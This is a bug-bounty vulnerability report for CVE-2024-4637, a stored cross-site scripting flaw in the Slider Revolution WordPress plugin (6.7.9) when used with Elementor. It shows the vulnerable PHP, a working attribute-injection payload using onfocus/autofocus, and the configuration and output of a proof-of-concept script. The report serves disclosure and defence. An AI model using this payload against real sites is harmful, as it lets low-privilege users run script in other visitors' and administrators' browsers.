# Post Report Info

- Link: https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/revslider/slider-revolution-6710-authenticated-contributor-stored-cross-site-scripting-via-elementor-wrapperid-and-zindex
- CVE: 2024-4637
- Bounty: $434

# Slider Revolution Authenticated (Contributor+) Stored-XSS

The Slider Revolution plugin version: 6.7.9 is vulnerable to an Authenticated (Contributor+) Stored-XSS attack when used with Elementor. This is due to user-controlled elementor display setting being inserted into a HTML attribute without sanitization.

## Affected Plugin

Title: Slider Revolution
Users: >9,000,000 (Stated on website)
CodeCanyon Sales: >423,000 (https://codecanyon.net/item/slider-revolution-responsive-wordpress-plugin/2751380)
Version: 6.7.9
Slug: revslider
Link: https://www.sliderrevolution.com/

## Root Cause

In `admin/includes/shortcode_generator/elementor/elementor-widget.class.php` on lines 145 and 149 the user-controllable elementor display settings `wrapperid` and `zindex` respectively are obtained:

```php
$shortcode = $this->get_settings_for_display( 'shortcode' );
$wrapperid = $this->get_settings_for_display( 'wrapperid' );
$wrapperid = empty($wrapperid) ? '': 'id="' . $wrapperid . '" ';
$shortcode = do_shortcode( shortcode_unautop( $shortcode ) );

$zindex = $this->get_settings_for_display( 'zindex' );
$style = $zindex ? ' style="z-index:'.$zindex.';"' : '';
?>
```
These are then inserted into HTML attributes without sanitization on line 160:

```php
<div <?php echo $wrapperid; ?>class="wp-block-themepunch-revslider"<?php echo $style;?>><?php echo $shortcode; ?></div>
```

## Example Payload

For example an `wrapperid` of:
```
x"tabindex="1"autofocus=""onfocus="alert(`xss`)"x="
```

Will result in the following HTML:

```
<div id="x"tabindex="1"autofocus=""onfocus="alert(`xss`)"x="" ...
```

Resulting in JavaScript execution when the element is created and steals the focus automatically.

## Proof of Concept

1. Install and activate `elementor` and `revslider` plugins. Note slider revolution is only available as a paid plugin, cheapest place to get it is directly from their website https://account.sliderrevolution.com/portal/pricing/.
2. Modify the PoC Python script (below) with the info for your target, eg:
```
USER = 'user'
PASSWORD = 'user'
PAYLOAD_ID = 1
TARGET = 'http://wordpress.local:1337'
```
3. Run the PoC and visit the link to observe JavaScript execution.
```
❯ python3 revslider-xss.py
[+] Login Successful
[+] Nonce: 0cc5e97557
[+] Next Post ID: 247
[+] API Nonce: 83575f7c9c
{"id":247, ... }
[+] Post ID: 247
[+] Payload: 1
{'success': True, ... }
[+] Updated Post: 247
[+] Visit: http://wordpress.local:1337/?p=247
```
